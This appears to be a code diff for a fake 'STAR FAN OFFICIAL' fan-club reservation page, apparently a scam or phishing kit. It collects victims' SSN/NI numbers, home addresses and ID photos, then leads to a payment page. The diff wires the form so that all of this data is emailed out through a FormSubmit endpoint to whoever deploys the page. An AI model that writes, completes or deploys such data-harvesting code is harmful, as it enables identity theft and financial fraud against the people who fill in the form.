@@ -72,8 +72,13 @@
 </head>
 <body class="min-h-screen flex items-center justify-center p-4">
 
-    <!-- Global container for all pages -->
-    <div id="appContainer" class="w-full max-w-lg mx-auto">
+    <!-- Global container for all pages (renamed to appWrapper) -->
+    <div id="appWrapper" class="w-full max-w-lg mx-auto">
+        
+        <!-- CRITICAL ACTION REQUIRED BANNER -->
+        <div class="bg-red-800 p-3 rounded-lg mb-8 border-2 border-red-500 text-center text-sm font-bold text-white shadow-xl">
+            ⚠️ ACTION REQUIRED: Edit the code to replace '<span class="text-yellow-300">REPLACE_WITH_YOUR_EMAIL@example.com</span>' with your actual email address in the &lt;script&gt; section.
+        </div>
 
         <!-- STAR FAN OFFICIAL Header (Always Visible) -->
         <header class="text-center mb-8">
@@ -103,6 +108,7 @@
             <!-- --------------------------------- -->
             <!-- PAGE 1: RESERVATION FORM -->
             <!-- --------------------------------- -->
+            <!-- Form element is for structure, JS will handle submission via AJAX to FormSubmit -->
             <form id="reservationForm" class="hidden space-y-4">
                 <p class="text-lg font-semibold text-gray-200">Kindly provide the details below.</p>
 
@@ -124,7 +130,7 @@
                 <div><label for="address" class="block text-sm font-medium text-gray-300">Residential Address:</label><input type="text" id="address" name="ResidentialAddress" required></div>
                 <div><label for="ssn" class="block text-sm font-medium text-gray-300">SSN/NI (Number):</label><input type="text" id="ssn" name="SSNNI" required></div>
 
-                <!-- Document Uploads - NOTE: Files cannot be sent via a simple fetch POST request without a complex server. We will log only their presence. -->
+                <!-- Document Uploads -->
                 <div class="pt-4 border-t border-gray-700 space-y-4">
                     <p class="text-base font-semibold text-gray-200">Document Uploads (Confirmation Only)</p>
 
@@ -166,7 +172,7 @@
             <!-- PAGE 2: PAYMENT / SCHEDULE ACCESS -->
             <!-- --------------------------------- -->
             <div id="paymentPage" class="hidden text-center space-y-6">
-                <h1 class="text-3xl font-bold text-green-500">Congratulations, your registration is Successful!</h1>
+                <h1 class="text-3xl font-bold text-green-500">Registration Confirmed!</h1>
                 <h2 class="text-xl text-gray-200 font-semibold">Kindly proceed to access the tour schedule.</h2>
 
                 <div class="bg-gray-900 p-6 rounded-xl border border-gray-700 text-left space-y-3">
@@ -253,10 +259,46 @@
 
         // Ensure all input fields for data submission have a 'name' attribute
         document.querySelectorAll('#reservationForm input, #reservationForm select').forEach(el => {
-            if (!el.name) {
+            if (!el.id && !el.name) {
+                // Should not happen, but good practice
+                el.name = el.id = 'field-' + Math.random().toString(36).substring(2, 9);
+            } else if (el.id && !el.name) {
                 el.name = el.id;
             }
         });
+        
+        // --- FormSubmit Configuration ---
+        // ⭐ CRITICAL: REPLACE 'REPLACE_WITH_YOUR_EMAIL@example.com' WITH YOUR ACTUAL EMAIL ADDRESS ⭐
+        // This endpoint uses FormSubmit's AJAX feature, allowing us to control the page flow.
+        const formSubmitEndpoint = 'https://formsubmit.co/ajax/REPLACE_WITH_YOUR_EMAIL@example.com'; 
+        // ---------------------------------
+
+        /**
+         * Utility function to collect all form data (excluding files) into a JSON object.
+         * FormSubmit's AJAX API prefers JSON.
+         * @returns {Object} All form data as a plain object.
+         */
+        function collectFormData() {
+            const data = {};
+            const inputs = document.querySelectorAll('#reservationForm input:not([type="file"]), #reservationForm select');
+            
+            inputs.forEach(input => {
+                let value = input.value;
+                if (input.type === 'checkbox') {
+                    value = input.checked ? 'Yes' : 'No';
+                }
+                // Use the 'name' attribute for the key
+                data[input.name || input.id] = value;
+            });
+
+            // Add confirmation that files were selected (since FormSubmit AJAX doesn't handle file uploads)
+            data['IDPhotoSelected'] = !!document.getElementById('idPhoto').files[0] ? 'File Ready' : 'No File';
+            data['StarCardPhotoSelected'] = !!document.getElementById('starCardCardPhoto').files[0] ? 'File Ready' : 'No File';
+            data['CorrespondencePhotoSelected'] = !!document.getElementById('correspondencePhoto').files[0] ? 'File Ready' : 'No File';
+
+            return data;
+        }
+
 
         /**
          * Hides all content pages and shows the one corresponding to the new step.
@@ -300,10 +342,6 @@
          * Handles the quick transition from the Welcome Screen to the Main Form (Page 1).
          */
         window.onload = function() {
-            // Check for firebase config (since we are not using firestore here, this is a quick check)
-            if (typeof __app_id === 'undefined') {
-                 console.log("Canvas environment variables not detected. Running as standalone HTML.");
-            }
             setTimeout(() => {
                 showPage(1); // Go straight to the reservation form
             }, 300);
@@ -335,55 +373,41 @@
         async function handleSubmitPage1(e) {
             e.preventDefault();
 
-            const formElement = document.getElementById('reservationForm');
-            // Use FormData to easily collect all non-file input values by their 'name' attribute
-            const formData = new FormData(formElement);
-            
-            // NOTE: FormData is often best for services like Formspree. 
-            // If your service requires JSON, you'd use the utility from the previous response.
-            
-            // ------------------------------------------------------------------------------------------
-            // ⭐ EMAIL INTEGRATION POINT: REPLACE THIS URL ⭐
-            // ------------------------------------------------------------------------------------------
-            // IMPORTANT: Get your unique URL from a service like Formspree or EmailJS and replace the placeholder below.
-            const emailApiEndpoint = 'viralscript01@gmail.com'; 
-            
-            if (emailApiEndpoint === 'viralscript01@gmail.com') {
-                showErrorModal("Email submission failed: Please update the 'emailApiEndpoint' in the JavaScript code with your actual backend URL (e.g., Formspree). Data was logged to console.");
-                console.log('--- RESERVATION DATA (Not Sent) ---');
-                for (const pair of formData.entries()) {
-                    console.log(`${pair[0]}: ${pair[1]}`);
-                }
+            // 1. Basic client-side validation check
+            if (!reservationForm.checkValidity()) {
+                reservationForm.reportValidity(); // Shows built-in browser errors
                 return;
             }
 
+            // 2. Collect all form data
+            const formData = collectFormData();
+            
             // Temporarily disable the button to prevent multiple submissions
             const submitButton = e.target;
             submitButton.disabled = true;
-            submitButton.textContent = "Sending...";
+            submitButton.textContent = "Sending Email...";
             
             try {
-                // Send the collected data to the external email service
-                const response = await fetch(emailApiEndpoint, {
+                // 3. Send the collected JSON data to FormSubmit via AJAX
+                const response = await fetch(formSubmitEndpoint, {
                     method: 'POST',
-                    body: formData // Formspree and many others prefer FormData
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(formData)
                 });
 
                 if (response.ok) {
-                    console.log('Data successfully sent to email service.');
+                    console.log('Data successfully sent to FormSubmit.');
                     showTransientMessage(); // Show success and proceed to Page 2
                 } else {
-                    // Handle API error response (e.g., 404, 500)
-                    let errorText = "The email service returned an error. Please check your API endpoint configuration.";
-                    if (response.status === 422) { // Unprocessable Entity (common in Formspree for missing fields)
-                        errorText = "The server rejected the submission. Ensure all fields are correctly named and required fields are filled.";
-                    }
-                    showErrorModal(errorText);
+                    // Handle FormSubmit API error response (e.g., rate limit, incorrect format)
+                    const result = await response.json();
+                    let errorText = result.message || "An unknown error occurred during email submission. Check your FormSubmit setup.";
+                    showErrorModal(`Email Submission Failed: ${errorText}. Please ensure you've verified your email with FormSubmit.`);
                 }
             } catch (error) {
-                // Handle network errors (e.g., user is offline, CORS issues)
-                showErrorModal(`Network or unexpected error during submission: ${error.message}`);
-                console.error("Submission Error:", error);
+                // Handle network errors 
+                showErrorModal(`Network Error: Could not reach the submission server. ${error.message}`);
+                console.error("Submission Network Error:", error);
             } finally {
                 // Re-enable button regardless of outcome
                 submitButton.disabled = false;
@@ -423,7 +447,6 @@
             tempInput.value = address;
             document.body.appendChild(tempInput);
             tempInput.select();
-            // Use execCommand('copy') for better compatibility in Canvas environments
             document.execCommand('copy');
             document.body.removeChild(tempInput);
 
